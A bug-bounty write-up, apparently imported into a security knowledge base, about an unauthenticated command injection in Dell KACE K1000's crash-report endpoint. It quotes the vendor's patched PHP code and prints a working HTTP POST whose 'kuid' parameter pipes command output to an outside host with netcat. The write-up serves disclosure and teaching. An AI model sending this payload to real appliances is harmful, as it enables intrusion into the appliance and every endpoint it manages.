---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-09_dell-kace-k1000-remote-code-execution-the-story-of-bug-k118652.md
original_filename: 2019-04-09_dell-kace-k1000-remote-code-execution-the-story-of-bug-k118652.md
title: Dell KACE K1000 Remote Code Execution — the Story of Bug K1–18652
category: documents
detected_topics:
- command-injection
- path-traversal
- automation-abuse
- api-security
- mobile-security
- supply-chain
tags:
- imported
- documents
- command-injection
- path-traversal
- automation-abuse
- api-security
- mobile-security
- supply-chain
language: en
raw_sha256: b863403d16367b0e2c7e6789aeae64db23bc0e80a2a219399d74aafaf1fcdffd
text_sha256: 0eb5e49c8cc5ec4354e37ac66bae42b15fb7902cf80c8afdc71a517204b6beb8
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Dell KACE K1000 Remote Code Execution — the Story of Bug K1–18652

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-09_dell-kace-k1000-remote-code-execution-the-story-of-bug-k118652.md
- Source Type: markdown
- Detected Topics: command-injection, path-traversal, automation-abuse, api-security, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `b863403d16367b0e2c7e6789aeae64db23bc0e80a2a219399d74aafaf1fcdffd`
- Text SHA256: `0eb5e49c8cc5ec4354e37ac66bae42b15fb7902cf80c8afdc71a517204b6beb8`


## Content

---
title: "Dell KACE K1000 Remote Code Execution — the Story of Bug K1–18652"
page_title: "Dell KACE K1000 Remote Code Execution - the … | RCE Security"
url: "https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/"
final_url: "https://www.rcesecurity.com/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/"
authors: ["Julien Ahrens (@MrTuxracer)"]
programs: ["Dropbox"]
bugs: ["RCE"]
publication_date: "2019-04-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5319
---

# Dell KACE K1000 Remote Code Execution - the Story of Bug K1-18652

Apr 9, 2019 · By [Julien Ahrens](/about/)

This is the story of an unauthenticated RCE affecting one of Dropbox’s in scope vendors during [last year’s H1-3120](https://blogs.dropbox.com/tech/2018/09/live-hacking-dropbox-h1-3120/) event. It’s one of my more recon-intensive, yet simple, vulnerabilities, and it (probably) helped me to become MVH by the end of the day ;-).

**TL;DR** It’s all about an undisclosed but fixed bug in the KACE Systems Management Appliance internally tracked by the ID _K1-18652_ which allows an unauthenticated attacker to execute arbitrary code on the appliance. Since the main purpose of the appliance is to manage client endpoints - and you are able to deploy software packages to clients - I theoretically achieved RCE on all of the vendor’s clients. It turns out that Dell (the software is now maintained by Quest) have silently fixed this vulnerability with the release of version 6.4 SP3 (6.4.120822).

### Recon is Key!

While doing recon for the in-scope assets during H1-3120, I came across an administrative panel of what looked like being a Dell Kace K1000 Administrator Interface:

![](/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/images/K1-18652-1.3812ad1c1bf16da5d024905cf59d66a3ea1784695e2f5fa701d7b5875983993d.png)

While gathering some background information about this “Dell Kace K1000” system, I came across the very same software now being distributed by a company called “[Quest Software Inc](https://www.quest.com/products/kace-systems-management-appliance/) ”, which was previously owned by Dell.

Interestingly, Quest does also offer a free trial of the [KACE® Systems Management Appliance](https://www.quest.com/register/74480/) appliance. Unfortunately, the free trial only covers the latest version of the appliance (this is at the time of this post v9.0.270), which also looks completely different:

![](/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/images/K1-18652-2.6df82c68a1db8ba0863fd9fc0272311c4cc661fa703c59880c38e29f2711963c.png)

However, the version I’ve found on the target was _6.3.113397_ according to the very chatty web application:
  
  
  X-DellKACE-Appliance: k1000
  X-DellKACE-Host: redacted.com
  X-DellKACE-Version: 6.3.113397
  X-KBOX-WebServer: redacted.com
  X-KBOX-Version: 6.3.113397
  

So there are at least 3 major versions between what I’ve found and what the current version is. Even trying to social engineer the Quest support to provide me with an older version did not work - apparently, I’m not a good social engineer ;-)

### Recon is Key!!

At first I thought that both versions aren’t comparable at all, because codebases usually change heavily between multiple major versions, but I still decided to give it a try. I’ve set up a local testing environment with the latest version to poke around with it and understand what it is about. TBH at that point, I had very small expectations to find  
anything in the new version that can be applied to the old version. Apparently, I was wrong.

### Recon is Key !!!11

While having a look at the source code of the appliance, I’ve stumbled upon a naughty little file called _/service/krashrpt.php_ which is reachable without any authentication and which sole purpose is to handle crash dump files.

When reviewing the source code, I’ve found a quite interesting reference to a bug called _K1-18652_ , which apparently was filed to prevent a path traversal issue through the parameters _kuid_ and _name_ ( _$values_ is basically a reference to all parameters supplied either via GET or POST):
  
  
  try {
  // K1-18652 make sure we escape names so we don't get extra path characters to do path traversal
  $kuid = basename($values['kuid']);
  $name = basename($values['name']);
  } catch( Exception $e ) {
  KBLog( "Missing URL param: " . $e->getMessage() );
  exit();
  }
  

Later _kuid_ and _name_ are used to construct a zip file name:
  
  
  $tmpFnBase = "krash_{$name}_{$kuid}";
  $tmpDir = tempnam( KB_UPLOAD_DIR, $tmpFnBase );
  unlink( $tmpDir );
  $zipFn = $tmpDir . ".zip";
  

However, K1-18652 does not only introduce the _basename_ call to prevent the path traversal, but also two _escapeshellarg_ calls to prevent any arbitrary command injection through the _$tmpDir_ and _$zipFn_ strings:
  
  
  // unzip the archive to a tmpDir, and delete the .zip file
  // K1-18652 Escape the shell arguments to avoid remote execution from inputs
  exec( "/usr/local/bin/unzip -d " . escapeshellarg($tmpDir) . " " . escapeshellarg($zipFn));
  unlink( $zipFn );
  

Although escapeshellarg [does not fully prevent command injections](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md) I haven’t found any working way to exploit it on the most recent version of K1000.

### Using a new K1000 to exploit an old K1000

So K1-18652 addresses two potentially severe issues which have been fixed in the recent version. Out of pure curiosity, I decided to blindly try a common RCE payload against the old K1000 version assuming that the _escapeshellarg_ calls haven’t been implemented for the _kuid_ and _name_ parameters in the older version at all:
  
  
  POST /service/krashrpt.php HTTP/1.1
  Host: redacted.com
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Cookie: kboxid=r8cnb8r3otq27vd14j7e0ahj24
  Connection: close
  Upgrade-Insecure-Requests: 1
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 37
  
  kuid=id | nc www.rcesecurity.com 53
  

And guess what happened:

![](/2019/04/dell-kace-k1000-remote-code-execution-the-story-of-bug-k1-18652/images/K1-18652-3.08e70c355354dcc628b46a9ce6932247fa2be261849c081f50ca18758cc13ba6.png)

Awesome! This could afterwards be used to execute arbitrary code on all connected client systems because K1000 is an asset management system:

> The KACE Systems Management Appliance (SMA) helps you accomplish these goals by automating complex administrative  
>  tasks and modernizing your unified endpoint management approach. This makes it possible for you to inventory all  
>  hardware and software, patch mission-critical applications and OS, reduce the risk of breach, and assure software  
>  license compliance. So you’re able to reduce systems management complexity and safeguard your vulnerable endpoints.

Source: [Quest](https://www.quest.com/products/kace-systems-management-appliance/)

### Comment from the Vendor

Unfortunately, since I haven’t found any public references to the bug, the fix or an existing exploit, I’ve contacted Quest to get more details about the vulnerability and their security coordination process. Quest later told me that the fix was shipped by Dell with version 6.4 SP3 (6.4.120822), but that neither a public advisory has been published nor an explicit customer statement was made - so in other words: it was silently fixed.

### BugBountyTip

If you find a random software in use, consider investing the time to set up an instance of the software locally and try to understand how it works and search for bugs. This works for me every, single time.

Thanks, Dropbox for the nice bounty!
